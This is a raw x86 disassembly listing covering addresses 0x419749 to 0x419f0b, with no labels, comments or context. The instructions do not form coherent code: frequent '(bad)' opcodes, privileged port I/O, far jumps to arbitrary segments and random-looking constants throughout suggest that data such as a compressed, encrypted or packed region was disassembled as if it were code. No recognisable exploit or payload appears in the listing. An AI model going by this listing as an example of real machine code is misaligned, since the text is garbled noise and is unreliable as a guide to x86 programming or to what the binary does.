  419749:	mov    al,0x93
  41974b:	mov    eax,ds:0x7aac80c8
  419750:	or     DWORD PTR [esi-0x59],eax
  419753:	aaa    
  419754:	cwde   
  419755:	shl    BYTE PTR [eax],0xca
  419758:	(bad)  
  419759:	pop    ebp
  41975a:	xor    BYTE PTR [edx+0x22578bdb],ch
  419760:	mov    bp,0xb35b
  419764:	xlat   BYTE PTR ds:[ebx]
  419765:	jmp    0x41970f
  419767:	leavew 
  419769:	mov    esi,0x5eece78b
  41976e:	call   0xe2d14e8c
  419773:	add    cl,BYTE PTR [edx+0x8]
  419776:	das    
  419777:	popf   
  419778:	mov    ds:0x2f6c4ad0,eax
  41977d:	loopne 0x4197ef
  41977f:	lods   al,BYTE PTR ds:[esi]
  419780:	xchg   BYTE PTR [edi-0x18],ah
  419783:	js     0x419759
  419785:	mov    ?,WORD PTR [edx]
  419787:	out    0x2d,al
  419789:	mov    eax,ds:0x43850723
  41978e:	out    dx,eax
  41978f:	mov    ebx,0x39dfd940
  419794:	push   esi
  419795:	fisubr WORD PTR [ecx]
  419797:	mov    ebx,0x6b9ba0cf
  41979c:	les    edx,FWORD PTR fs:[esi-0x6628b3b4]
  4197a3:	jge    0x4197a5
  4197a5:	xchg   esp,eax
  4197a6:	fidivr DWORD PTR [edx+0x67]
  4197a9:	(bad)  
  4197aa:	out    0xd0,al
  4197ac:	ins    BYTE PTR es:[edi],dx
  4197ad:	mov    eax,0x54057249
  4197b2:	jg     0x419780
  4197b4:	mov    ecx,0x80cf75d6
  4197b9:	inc    edx
  4197ba:	mov    edi,0x729e9620
  4197bf:	inc    esp
  4197c0:	shr    BYTE PTR [edx-0x66],0xf
  4197c4:	les    eax,FWORD PTR [ebx]
  4197c6:	aas    
  4197c7:	repz mov eax,DWORD PTR [ebx+ebp*4]
  4197cb:	xor    eax,0xf4f91a2d
  4197d0:	mov    esi,0x188d24c8
  4197d5:	outs   dx,DWORD PTR ds:[esi]
  4197d6:	push   ss
  4197d7:	sbb    ah,BYTE PTR [edx-0x41]
  4197da:	push   eax
  4197db:	bound  esp,QWORD PTR [eax+0x79]
  4197de:	or     cl,BYTE PTR [edi-0x72]
  4197e1:	or     al,0x49
  4197e3:	fdiv   DWORD PTR [ebp+0x7c5a8ef]
  4197e9:	out    dx,eax
  4197ea:	mov    ecx,0xa51d6d3c
  4197ef:	outs   dx,BYTE PTR ds:[esi]
  4197f0:	add    DWORD PTR [edx+0x41],0x16c8b11e
  4197f7:	mov    ah,0xfa
  4197f9:	jb     0x4197f8
  4197fb:	ficomp DWORD PTR [ecx+0x2c45504b]
  419801:	(bad)  
  419802:	enter  0x9882,0x91
  419806:	call   0x90afad5
  41980b:	mov    ecx,0xeb7c78cb
  419810:	push   esi
  419811:	call   0xc7004fd9
  419816:	sub    DWORD PTR [ebx+0x43a59ba6],eax
  41981c:	mov    DWORD PTR [edx+edx*8+0x5f1d4950],edi
  419823:	sahf   
  419824:	out    dx,eax
  419825:	cmp    eax,edi
  419827:	iret   
  419828:	aad    0xae
  41982a:	push   esi
  41982b:	(bad)  
  41982c:	cmp    eax,0xf369c196
  419831:	(bad)  
  419833:	add    eax,0x444e3fd
  419838:	inc    edi
  419839:	dec    ecx
  41983a:	cmp    DWORD PTR [edi+edi*8],0x52
  41983e:	popa   
  41983f:	ret    
  419840:	pop    edi
  419841:	icebp  
  419842:	test   DWORD PTR [ecx-0x405a7e4e],edx
  419848:	and    DWORD PTR [eax+0x5f],ebx
  41984b:	ins    BYTE PTR es:[edi],dx
  41984c:	bound  edi,QWORD PTR [edi]
  41984e:	adc    bh,ah
  419850:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419851:	mov    ch,0x5b
  419853:	sti    
  419854:	push   ebx
  419855:	int3   
  419856:	inc    ebx
  419857:	nop
  419858:	sub    dh,cl
  41985a:	in     eax,dx
  41985b:	fist   WORD PTR [ebp+0x58d51f7f]
  419861:	pop    edi
  419862:	push   es
  419863:	adc    al,BYTE PTR [ebx+0x46]
  419866:	hlt    
  419867:	outs   dx,BYTE PTR ds:[esi]
  419868:	or     esi,ebp
  41986a:	cmp    al,0xb7
  41986c:	add    ebx,DWORD PTR [ecx+esi*4]
  41986f:	or     ebp,DWORD PTR [edx+0x79]
  419872:	out    dx,al
  419873:	push   ebx
  419874:	sub    DWORD PTR [ebp*1-0x748a4e7f],0xffffffa6
  41987c:	push   edx
  41987d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41987e:	mov    ds:0xb1d2d4f9,al
  419883:	dec    ebp
  419884:	cmp    eax,0xc476ca23
  419889:	shl    DWORD PTR ss:[esi-0x5f],cl
  41988d:	sub    bl,BYTE PTR [ebp+0x319dcff]
  419893:	sub    edi,DWORD PTR [ebx+0x4db59aa9]
  419899:	shr    BYTE PTR [edi-0x14],cl
  41989c:	cmp    DWORD PTR [di],edi
  41989f:	ja     0x41982a
  4198a1:	inc    edi
  4198a2:	dec    ebp
  4198a3:	push   ebx
  4198a4:	sbb    DWORD PTR [edx],esi
  4198a6:	pop    es
  4198a7:	out    0xea,al
  4198a9:	and    BYTE PTR [eax-0x16078a6f],ch
  4198af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198b0:	jbe    0x41989a
  4198b2:	dec    edx
  4198b3:	jb     0x419887
  4198b5:	push   es
  4198b6:	ror    DWORD PTR [esi],cl
  4198b8:	fist   WORD PTR [esi]
  4198ba:	(bad)  
  4198bb:	nop
  4198bc:	les    eax,FWORD PTR [esi+esi*4]
  4198bf:	and    ch,bl
  4198c1:	shl    BYTE PTR [ebx],0x13
  4198c4:	pop    ebp
  4198c5:	dec    ebx
  4198c6:	pop    ss
  4198c7:	aas    
  4198c8:	sbb    al,0x3c
  4198ca:	add    DWORD PTR [eax],ebx
  4198cc:	xchg   esi,eax
  4198cd:	mov    bl,0xf
  4198cf:	in     al,0xf9
  4198d1:	push   edx
  4198d2:	mov    esi,ecx
  4198d4:	in     al,0x98
  4198d6:	inc    esp
  4198d7:	dec    esi
  4198d8:	pop    ebp
  4198d9:	pop    ecx
  4198da:	(bad)  
  4198db:	fs ins BYTE PTR es:[edi],dx
  4198dd:	push   edi
  4198de:	mov    edx,0xd4159721
  4198e3:	pushf  
  4198e4:	call   0xe89a43e3
  4198e9:	shr    BYTE PTR [edi+0x43a230f0],0xe9
  4198f0:	add    al,0xe6
  4198f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198f3:	fs ss cld 
  4198f6:	push   eax
  4198f7:	dec    ecx
  4198f8:	cmp    eax,0x5fc8e567
  4198fd:	and    BYTE PTR [eax-0x7c],bh
  419900:	sbb    eax,0xdb628a88
  419905:	fbstp  TBYTE PTR [ecx+0x32]
  419908:	xlat   BYTE PTR ds:[ebx]
  419909:	mov    edx,0x22d47fa4
  41990e:	sub    al,0xfc
  419910:	std    
  419911:	add    ebx,DWORD PTR [ebp-0x887d074]
  419917:	xor    esi,DWORD PTR [edi+ebx*2-0x510a5845]
  41991e:	xor    edx,DWORD PTR [ebp+0x3e]
  419921:	lock enter 0x76cf,0x24
  419926:	mov    edi,DWORD PTR [ebp-0x14e1c48f]
  41992c:	inc    eax
  41992d:	call   0xe4e51ba5
  419932:	sbb    DWORD PTR [edi+0x6cbe654b],ebp
  419938:	lods   al,BYTE PTR ds:[esi]
  419939:	xchg   BYTE PTR [ebx],ah
  41993b:	rol    DWORD PTR [eax+0x29797dc3],cl
  419941:	sti    
  419942:	ret    0xc1a8
  419945:	fcomp  DWORD PTR [eax]
  419947:	mov    esp,0x40cf487c
  41994c:	mov    ds:0xbcc805a6,al
  419951:	cdq    
  419952:	mov    dh,0x1e
  419954:	mov    DWORD PTR [ebp+0x33a424fc],0x13d724dc
  41995e:	call   0xb210fd8e
  419963:	pop    ds
  419964:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419965:	and    al,0x2e
  419967:	fisubr DWORD PTR [eax+edi*4]
  41996a:	xlat   BYTE PTR ds:[ebx]
  41996b:	mov    edx,0x5201c58e
  419970:	jbe    0x419993
  419972:	jmp    0x49937c49
  419977:	mov    al,ds:0xd142665f
  41997c:	inc    edx
  41997d:	xor    esp,ebx
  41997f:	xchg   DWORD PTR [ecx],ebx
  419981:	mov    ds:0xdd82d725,al
  419986:	sbb    al,0xcc
  419988:	pop    es
  419989:	das    
  41998a:	sbb    al,0xac
  41998c:	push   ebp
  41998d:	add    BYTE PTR ds:0x2a65c4d8,bh
  419993:	push   ds
  419994:	inc    edx
  419995:	retf   
  419996:	xchg   ecx,eax
  419997:	push   es
  419998:	lahf   
  419999:	lods   al,BYTE PTR ds:[esi]
  41999a:	mov    eax,ds:0xf7a50bcb
  41999f:	ret    
  4199a0:	ret    0xad4b
  4199a3:	mov    ds:0x9401f51e,eax
  4199a8:	stos   BYTE PTR es:[edi],al
  4199a9:	jno    0x419997
  4199ab:	adc    al,0x95
  4199ad:	ret    
  4199ae:	and    al,0x6d
  4199b0:	add    eax,0x47e3d8f
  4199b5:	and    eax,0x3ca004df
  4199ba:	jo     0x419958
  4199bc:	pop    edx
  4199bd:	adc    ecx,edx
  4199bf:	cdq    
  4199c0:	push   esi
  4199c1:	jmp    0xf6cafee5
  4199c6:	push   0x2fc746e5
  4199cb:	push   ss
  4199cc:	cmp    eax,0x7fabf159
  4199d1:	(bad)  
  4199d2:	sar    BYTE PTR [eax],cl
  4199d4:	shl    BYTE PTR [edx],1
  4199d6:	cdq    
  4199d7:	(bad)  [edi]
  4199d9:	rcr    BYTE PTR [eax],cl
  4199db:	ret    
  4199dc:	icebp  
  4199dd:	push   0xffffffe4
  4199df:	test   al,0x8c
  4199e1:	mov    ds:0xeecef627,al
  4199e6:	and    BYTE PTR [esi+0x25],ch
  4199e9:	imul   edi,DWORD PTR [edi],0xffffffe0
  4199ec:	pop    ss
  4199ed:	inc    edi
  4199ee:	shl    DWORD PTR [edi],1
  4199f0:	sti    
  4199f1:	call   0x737b6e6d
  4199f6:	adc    DWORD PTR [ebp-0x56],ebx
  4199f9:	out    0x7f,eax
  4199fb:	adc    edi,esi
  4199fd:	push   es
  4199fe:	or     ebp,DWORD PTR [eax-0x202e81d8]
  419a04:	(bad)  
  419a05:	clc    
  419a06:	call   0xc8f:0xd55ca1cd
  419a0d:	test   al,0x49
  419a0f:	jp     0x4199f0
  419a11:	ror    ch,1
  419a13:	hlt    
  419a14:	push   ebx
  419a15:	ret    
  419a16:	push   edx
  419a17:	les    ecx,FWORD PTR [edi+edx*4-0x71]
  419a1b:	fdivr  st(0),st
  419a1d:	mov    ch,0x36
  419a1f:	rol    BYTE PTR [ebp+0x28],cl
  419a22:	(bad)  
  419a23:	shr    DWORD PTR [ebp-0x2162bc24],1
  419a29:	(bad)  
  419a2a:	hlt    
  419a2b:	xchg   ecx,eax
  419a2c:	or     eax,edx
  419a2e:	retf   0x160
  419a31:	mov    eax,0x5c509b1a
  419a36:	sub    BYTE PTR [ebx-0x1b61e746],0x34
  419a3d:	aam    0x18
  419a3f:	xor    al,0x23
  419a41:	jns    0x419a14
  419a43:	add    BYTE PTR [ebp-0x7b],ch
  419a46:	jl     0x419a37
  419a48:	add    esi,DWORD PTR [edi]
  419a4a:	mov    eax,DWORD PTR [eax]
  419a4c:	arpl   WORD PTR [eax+0x2f],sp
  419a4f:	lods   eax,DWORD PTR ds:[esi]
  419a50:	das    
  419a51:	psraw  mm4,QWORD PTR [edi]
  419a54:	mov    dl,0x38
  419a56:	dec    esp
  419a57:	mov    ecx,0x7f76afe0
  419a5c:	sub    BYTE PTR [esi+0x78],bh
  419a5f:	pcmpgtd mm4,QWORD PTR [ecx+0x11]
  419a63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419a64:	push   ss
  419a65:	ds popa 
  419a67:	mov    edx,0x9134c452
  419a6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a6d:	sbb    ch,BYTE PTR [edi+0x71]
  419a70:	sbb    eax,0x8746c8f7
  419a75:	xor    eax,0x4335d43f
  419a7a:	xchg   DWORD PTR [ebp+0x1560dc2b],esi
  419a80:	sbb    DWORD PTR [esi+edi*4],ebx
  419a83:	rcr    BYTE PTR [ecx+0x5e2e9613],cl
  419a89:	xchg   edi,eax
  419a8a:	push   ebx
  419a8b:	test   DWORD PTR [ebp-0x20d9c195],esp
  419a91:	daa    
  419a92:	aas    
  419a93:	mov    ebx,0x8e8b907a
  419a98:	test   DWORD PTR [edx],eax
  419a9a:	rol    ecx,0x77
  419a9d:	mov    ebp,0xb508d8d4
  419aa2:	shr    DWORD PTR [ebp+ebx*1-0x635f179f],0x8a
  419aaa:	and    al,0x85
  419aac:	or     BYTE PTR [edi-0x466569a],dh
  419ab2:	clc    
  419ab3:	mov    ebx,0x37513ef7
  419ab8:	push   es
  419ab9:	dec    edi
  419aba:	lds    edi,FWORD PTR [eax+0x47]
  419abd:	test   DWORD PTR [ecx+0x6d],edi
  419ac0:	jo     0x419a7d
  419ac2:	fdiv   QWORD PTR [eax+ebx*4+0x63]
  419ac6:	xchg   DWORD PTR [ecx+esi*2],eax
  419ac9:	jnp    0x419a7c
  419acb:	ja     0x419ae3
  419acd:	pop    eax
  419ace:	xchg   esi,eax
  419acf:	adc    BYTE PTR [ebp-0x1b],dh
  419ad2:	jecxz  0x419a71
  419ad4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ad5:	hlt    
  419ad6:	add    BYTE PTR es:[ebp-0x6b],dl
  419ada:	mov    esi,0x716049
  419adf:	clc    
  419ae0:	inc    edi
  419ae1:	xchg   BYTE PTR [edi+ecx*8+0x354074ea],al
  419ae8:	fistp  WORD PTR [ebp+0x924cfe1]
  419aee:	pop    edi
  419aef:	imul   ebx,ebx,0xffffffe5
  419af2:	mov    cl,0x24
  419af4:	ret    
  419af5:	sub    ecx,DWORD PTR [ecx+0x46942ab4]
  419afb:	pop    eax
  419afc:	xchg   ebp,eax
  419afd:	and    BYTE PTR [edi],bl
  419aff:	sbb    dh,dl
  419b01:	ins    DWORD PTR es:[edi],dx
  419b02:	mov    ch,0x61
  419b04:	mov    al,ds:0xae2d9cec
  419b09:	cmp    DWORD PTR fs:[edi+0x22],ebx
  419b0d:	out    dx,eax
  419b0e:	sti    
  419b0f:	sbb    al,0x25
  419b11:	stc    
  419b12:	lahf   
  419b13:	retf   0x904
  419b16:	je     0x419b68
  419b18:	call   0x9e25:0xc198005e
  419b1f:	je     0x419adf
  419b21:	cmp    al,0x8c
  419b23:	cmp    BYTE PTR [ebp+esi*8-0x48706146],0xe0
  419b2b:	std    
  419b2c:	test   DWORD PTR [eax],ebx
  419b2e:	xchg   ecx,eax
  419b2f:	stos   BYTE PTR es:[edi],al
  419b30:	mov    ds:0xbce948c6,eax
  419b35:	mov    ebp,esp
  419b37:	ins    BYTE PTR es:[edi],dx
  419b38:	pop    ss
  419b39:	addr16 add al,0x39
  419b3c:	jmp    FWORD PTR [ecx*4-0x6df4c2ba]
  419b43:	dec    ecx
  419b44:	fwait
  419b45:	xlat   BYTE PTR ds:[ebx]
  419b46:	jb     0x419b84
  419b48:	fs xor al,0xcc
  419b4b:	outs   dx,DWORD PTR ds:[esi]
  419b4c:	test   DWORD PTR [ebx],esp
  419b4e:	scas   eax,DWORD PTR es:[edi]
  419b4f:	ror    BYTE PTR [ebx+0x1e8a277b],cl
  419b55:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  419b57:	dec    eax
  419b58:	into   
  419b59:	retf   
  419b5a:	mov    ch,0x80
  419b5c:	xchg   DWORD PTR [ecx-0xe8cad9e],ebx
  419b62:	es jno 0x419b39
  419b65:	cli    
  419b66:	icebp  
  419b67:	sbb    eax,0xddeb04b1
  419b6c:	bound  ebp,QWORD PTR [ecx-0x5e0c9c55]
  419b72:	add    bl,BYTE PTR [ebp+0x3b96766f]
  419b78:	out    dx,al
  419b79:	repnz sahf 
  419b7b:	sbb    dl,dl
  419b7d:	(bad)  
  419b7e:	int    0x6d
  419b80:	fwait
  419b81:	addr16 into 
  419b83:	jle    0x419b19
  419b85:	mov    DWORD PTR [ecx-0x13],ebx
  419b88:	outs   dx,BYTE PTR ds:[esi]
  419b89:	ss push cs
  419b8b:	leave  
  419b8c:	pop    esp
  419b8e:	mov    ah,0x3b
  419b90:	jae    0x419b59
  419b92:	js     0x419b72
  419b94:	push   es
  419b95:	push   ds
  419b96:	push   esi
  419b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b98:	retf   0xef43
  419b9b:	leave  
  419b9c:	xchg   DWORD PTR cs:[ecx],esp
  419b9f:	mov    dh,0x75
  419ba1:	adc    ah,BYTE PTR [edx+edi*2-0x42e8bf61]
  419ba8:	mov    edx,0xf3792c8d
  419bad:	cld    
  419bae:	mov    esi,0x87a7c84e
  419bb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bb5:	xor    ebp,eax
  419bb7:	(bad)
  419bba:	ss int3 
  419bbc:	fdiv   QWORD PTR [edx-0x45]
  419bbf:	pop    edx
  419bc0:	and    DWORD PTR [esi+0x66],0xd479e3d2
  419bc7:	retf   
  419bc8:	inc    edx
  419bc9:	mov    al,ds:0x14d5a568
  419bce:	out    0xb5,eax
  419bd0:	push   esp
  419bd1:	xchg   ebp,eax
  419bd2:	arpl   WORD PTR [eax+0x781bb192],bp
  419bd8:	jg     0x419b9b
  419bda:	inc    edx
  419bdb:	out    0xbc,eax
  419bdd:	aaa    
  419bde:	std    
  419bdf:	mov    DWORD PTR [ecx-0x721cf52f],edx
  419be5:	fwait
  419be6:	loop   0x419c65
  419be8:	mov    dh,0x3f
  419bea:	imul   edi,DWORD PTR [edi+0x1d],0x77cf02b4
  419bf1:	mov    WORD PTR ds:0x5044067f,es
  419bf7:	in     eax,dx
  419bf8:	shr    DWORD PTR [edx],cl
  419bfa:	(bad)  
  419bfb:	or     eax,0x89f4f297
  419c00:	sub    BYTE PTR [edi],0xd1
  419c03:	test   al,0x7b
  419c05:	xlat   BYTE PTR ds:[ebx]
  419c06:	lahf   
  419c07:	cs xchg esi,eax
  419c09:	mov    cl,0x79
  419c0b:	loopne 0x419bc7
  419c0d:	repz repz inc ebx
  419c10:	sti    
  419c11:	in     eax,0x4e
  419c13:	scas   al,BYTE PTR es:[edi]
  419c14:	lea    ebp,[ebx]
  419c16:	scas   eax,DWORD PTR es:[edi]
  419c17:	fisubr WORD PTR [edx]
  419c19:	in     eax,dx
  419c1a:	pop    edx
  419c1b:	mov    DWORD PTR ds:0xf5ca1925,esi
  419c21:	repnz sti 
  419c23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c24:	jl     0x419c10
  419c26:	mov    dl,BYTE PTR [eax]
  419c28:	mov    gs:0x2edde361,eax
  419c2e:	int3   
  419c2f:	loop   0x419c9e
  419c31:	in     eax,dx
  419c32:	adc    BYTE PTR [esi],dh
  419c34:	xchg   edi,eax
  419c35:	cs inc esi
  419c37:	xor    al,0x94
  419c39:	daa    
  419c3a:	jne    0x419c52
  419c3c:	or     DWORD PTR [ecx],ebx
  419c3e:	das    
  419c3f:	xor    bh,bh
  419c41:	mov    edx,0xabf34b3e
  419c46:	dec    ebx
  419c47:	cmc    
  419c48:	dec    ecx
  419c49:	add    eax,0xb10fc09d
  419c4e:	add    eax,0x4c60fd05
  419c53:	aad    0x16
  419c55:	sub    eax,0x3da2f13b
  419c5a:	mov    ebx,0x1405ad45
  419c5f:	jg     0x419cad
  419c61:	xchg   edi,eax
  419c62:	shl    BYTE PTR ds:[ecx-0x3d1e0062],cl
  419c69:	pop    ebx
  419c6a:	and    eax,0xe3ffc112
  419c6f:	aad    0x4f
  419c71:	xor    esi,DWORD PTR [ebx]
  419c73:	pop    eax
  419c74:	dec    edi
  419c76:	retf   0x3435
  419c79:	imul   esi,DWORD PTR [esi],0x14
  419c7c:	hlt    
  419c7d:	(bad)  
  419c7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c7f:	inc    ebx
  419c80:	jle    0x419c99
  419c82:	(bad)  
  419c83:	push   esi
  419c84:	xchg   bh,dh
  419c86:	sbb    edx,0x41
  419c89:	ds fwait
  419c8b:	scas   al,BYTE PTR es:[di]
  419c8d:	sub    eax,0x52b75f43
  419c92:	adc    BYTE PTR [ebx+esi*8+0x1df2dc70],bh
  419c99:	enter  0x5117,0xc5
  419c9d:	adc    bl,bh
  419c9f:	iret   
  419ca0:	cmp    ebx,eax
  419ca2:	push   esi
  419ca3:	and    BYTE PTR [eax-0x7e],dl
  419ca6:	add    al,0x22
  419ca8:	jmp    0x650a:0xd8755f00
  419caf:	dec    ebx
  419cb0:	push   ebp
  419cb1:	pop    ecx
  419cb2:	xor    BYTE PTR [ecx+0x72],ah
  419cb5:	adc    DWORD PTR [ecx-0x5c],ecx
  419cb8:	xchg   ecx,eax
  419cb9:	pop    esp
  419cba:	sti    
  419cbb:	pop    esi
  419cbc:	push   0x77e1e9ac
  419cc1:	adc    BYTE PTR [ebx+eiz*2],0x72
  419cc5:	call   0xcf66b7d9
  419cca:	enter  0xb9b1,0xe0
  419cce:	fcmove st,st(3)
  419cd0:	or     eax,0xa338f3a4
  419cd5:	push   0xe13fd4e6
  419cda:	popa   
  419cdb:	les    esp,FWORD PTR [eax+ebp*8-0x42954880]
  419ce2:	(bad)  
  419ce3:	lahf   
  419ce4:	sub    al,0x91
  419ce6:	xchg   BYTE PTR [ebx-0x503d518a],dl
  419cec:	mov    ebp,0x32d904d7
  419cf1:	cmp    dl,ch
  419cf3:	rcr    BYTE PTR [edi+0x75fd6db8],0xa8
  419cfa:	rcr    DWORD PTR [ebp+0x34f61e8d],0x9
  419d01:	push   0xffffffd9
  419d03:	shl    BYTE PTR [eax],1
  419d05:	mov    esp,0x481d3b7e
  419d0a:	cmp    ah,ch
  419d0c:	mov    ds:0xdd2da18a,eax
  419d11:	das    
  419d12:	fcomp  DWORD PTR ds:0xf455748f
  419d18:	mov    esp,0x23647519
  419d1d:	icebp  
  419d1e:	fnstenv [edi]
  419d20:	mov    eax,ds:0xf1e432bd
  419d25:	fisubr WORD PTR [ecx]
  419d27:	aam    0x15
  419d29:	dec    edx
  419d2a:	mov    al,0xf
  419d2c:	add    bh,dh
  419d2e:	add    DWORD PTR [ebp+0x396c4520],ebp
  419d34:	jg     0x419cf6
  419d36:	inc    esp
  419d37:	out    0xe,eax
  419d39:	loop   0x419d8b
  419d3b:	(bad)  [ebx]
  419d3d:	fld    st(4)
  419d3f:	call   0xd740:0x1a19da1f
  419d46:	out    dx,al
  419d47:	sbb    cl,BYTE PTR [esi]
  419d49:	cs ins DWORD PTR es:[edi],dx
  419d4b:	xchg   ebp,esp
  419d4d:	sub    DWORD PTR [ebx],esp
  419d4f:	lahf   
  419d50:	sub    DWORD PTR [ecx],0xdce66d1e
  419d56:	test   al,0x8e
  419d58:	jmp    0x6141ee4f
  419d5d:	and    al,0x1f
  419d5f:	aad    0x61
  419d61:	inc    esi
  419d62:	adc    al,al
  419d64:	les    edi,FWORD PTR [edx]
  419d66:	popa   
  419d67:	jae    0x419d0f
  419d69:	das    
  419d6a:	cld    
  419d6b:	es popf 
  419d6d:	and    BYTE PTR [eax+0x4b],ah
  419d70:	xchg   ebx,eax
  419d71:	ficom  WORD PTR [ebp-0x2c3e2148]
  419d77:	pop    eax
  419d78:	dec    ebp
  419d79:	iret   
  419d7a:	jl     0xef6b9e95
  419d80:	dec    edi
  419d81:	xchg   esi,eax
  419d82:	dec    edx
  419d83:	jmp    DWORD PTR [edx+0x4d]
  419d86:	xchg   DWORD PTR [ebp+0xa],ebx
  419d89:	mov    ch,0x1
  419d8b:	xchg   esi,eax
  419d8c:	fsubr  QWORD PTR [eax]
  419d8e:	cmp    ecx,ecx
  419d90:	xor    al,0xca
  419d92:	mov    ss,WORD PTR [eax-0xa]
  419d95:	mov    al,ds:0x44075a0f
  419d9a:	and    DWORD PTR ds:0xd98c41fb,0xffffffb5
  419da1:	cmp    DWORD PTR [edx+0x4b],ecx
  419da4:	lock ins BYTE PTR es:[edi],dx
  419da6:	imul   ebx,DWORD PTR [esp+ecx*8],0xffffffc8
  419daa:	xchg   ebx,eax
  419dab:	adc    ebp,edx
  419dad:	jmpw   0x70a0
  419db1:	cld    
  419db2:	in     eax,0x1b
  419db4:	or     eax,DWORD PTR [edx-0x19]
  419db7:	push   esi
  419db8:	inc    esi
  419db9:	test   eax,0xd63615ea
  419dbe:	mov    edx,0xf25a99f6
  419dc3:	mov    ch,0x99
  419dc5:	mov    ch,0xfc
  419dc7:	popf   
  419dc8:	push   edi
  419dc9:	pop    ebx
  419dca:	add    DWORD PTR [ebx+0xbb563da],ebp
  419dd0:	jmp    0xf0d0971b
  419dd5:	or     DWORD PTR [ecx-0x27d85929],edx
  419ddb:	push   es
  419ddc:	xor    ebx,DWORD PTR [ebx]
  419dde:	mov    ?,WORD PTR [esi-0x38]
  419de1:	fs (bad) 
  419de3:	loop   0x419e45
  419de5:	popf   
  419de6:	in     al,dx
  419de7:	rol    BYTE PTR [ecx],1
  419de9:	or     eax,0x4a6298ce
  419dee:	push   0xffffffb0
  419df0:	rcr    DWORD PTR [ebx+0x52],1
  419df3:	bound  ebx,QWORD PTR [edi+eax*1+0x2f77432d]
  419dfa:	pop    esp
  419dfb:	mov    ch,0x68
  419dfd:	lock gs jle 0x419e35
  419e01:	pusha  
  419e02:	test   al,0x45
  419e04:	ja     0x419dd3
  419e06:	aad    0xa7
  419e08:	cmc    
  419e09:	frstor [esi+0x2c1a5f7e]
  419e0f:	pop    esi
  419e10:	outs   dx,BYTE PTR ds:[esi]
  419e11:	(bad)  
  419e12:	dec    DWORD PTR [esi]
  419e14:	mov    ch,BYTE PTR [ebp-0x19]
  419e17:	dec    eax
  419e18:	pusha  
  419e19:	and    eax,0x1ac931d4
  419e1e:	or     bh,0x1d
  419e21:	mov    dl,0x17
  419e23:	sub    al,dh
  419e25:	jge    0x419db5
  419e27:	(bad)  
  419e28:	into   
  419e29:	jbe    0x419eaa
  419e2b:	scas   eax,DWORD PTR es:[edi]
  419e2c:	into   
  419e2d:	stos   DWORD PTR es:[edi],eax
  419e2e:	xchg   ebp,eax
  419e2f:	and    DWORD PTR cs:[ebp-0x78],esi
  419e33:	lahf   
  419e34:	xchg   edx,eax
  419e35:	adc    eax,edi
  419e37:	inc    ebx
  419e38:	sahf   
  419e39:	lahf   
  419e3a:	clc    
  419e3b:	xchg   edx,eax
  419e3c:	lahf   
  419e3d:	int    0x63
  419e3f:	fcom   QWORD PTR [eax-0x25]
  419e42:	gs ins BYTE PTR es:[edi],dx
  419e44:	rcl    dl,0x4b
  419e47:	test   DWORD PTR [edi],edi
  419e49:	call   0xf7696bab
  419e4e:	mov    esp,0x6cc8a7db
  419e53:	add    al,0xe
  419e55:	cld    
  419e56:	into   
  419e57:	lahf   
  419e58:	pusha  
  419e59:	shr    BYTE PTR [ecx-0x224c6486],1
  419e5f:	bound  ecx,QWORD PTR [ecx+0xa]
  419e62:	js     0x419e48
  419e64:	ror    BYTE PTR [edx],1
  419e66:	sbb    bh,bh
  419e68:	test   eax,0x1d6aa0ed
  419e6d:	fimul  DWORD PTR [esi+0x5a]
  419e70:	xchg   esp,eax
  419e71:	stc    
  419e72:	dec    edx
  419e73:	push   edi
  419e74:	pusha  
  419e75:	pop    ds
  419e76:	mov    edx,0x79f9189e
  419e7b:	mov    ebx,0x61739c11
  419e80:	push   ss
  419e81:	out    0xb1,al
  419e83:	(bad)  
  419e84:	cmp    al,0x6b
  419e86:	call   0x80e1:0xa05db42
  419e8d:	mov    ch,0xab
  419e8f:	jae    0x419f07
  419e91:	arpl   WORD PTR fs:[esp+eax*1-0x1d],sp
  419e96:	pop    esi
  419e97:	lea    eax,[ebp-0x6fdae31d]
  419e9d:	fcomip st,st(4)
  419e9f:	lahf   
  419ea0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ea1:	cmp    DWORD PTR [edx+0x28],ebp
  419ea4:	push   ds
  419ea5:	add    eax,0x704ad6d7
  419eaa:	iret   
  419eab:	(bad)  
  419eac:	fcomp  DWORD PTR [ebx]
  419eae:	jns    0x419ecc
  419eb0:	xor    BYTE PTR ds:0xf6d0ff4f,0x17
  419eb7:	adc    edx,eax
  419eb9:	stos   BYTE PTR es:[edi],al
  419eba:	sahf   
  419ebb:	test   al,0x80
  419ebd:	mov    DWORD PTR [eax],ecx
  419ebf:	or     edx,ebx
  419ec1:	jno    0x419ecb
  419ec3:	ins    BYTE PTR es:[edi],dx
  419ec4:	ror    BYTE PTR [ecx+eiz*8],0x4c
  419ec8:	test   eax,ebp
  419eca:	pop    ebp
  419ecb:	pop    esi
  419ecc:	rcr    BYTE PTR [eax],0x97
  419ecf:	or     bl,bl
  419ed1:	ret    
  419ed2:	add    al,0xaa
  419ed4:	xchg   ecx,eax
  419ed5:	gs sbb dh,ch
  419ed8:	data16 aad 0x0
  419edb:	jmp    0x5c8c:0x88b36bc6
  419ee2:	jg     0x419ec7
  419ee4:	jle    0x419e8d
  419ee6:	mov    eax,0x88a353f8
  419eeb:	xchg   esi,eax
  419eec:	jo     0x419f42
  419eee:	add    edx,DWORD PTR [edx+0x6e9fc30]
  419ef4:	dec    ebx
  419ef5:	sbb    DWORD PTR [esi],0xf55686c1
  419efb:	popa   
  419efc:	stos   DWORD PTR es:[edi],eax
  419efd:	enter  0xf7f5,0xfa
  419f01:	repz int 0x26
  419f04:	mov    ch,0xa8
  419f06:	loop   0x419ef9
  419f08:	xchg   esi,eax
  419f09:	inc    esi
  419f0a:	push   es
  419f0b:	push   gs
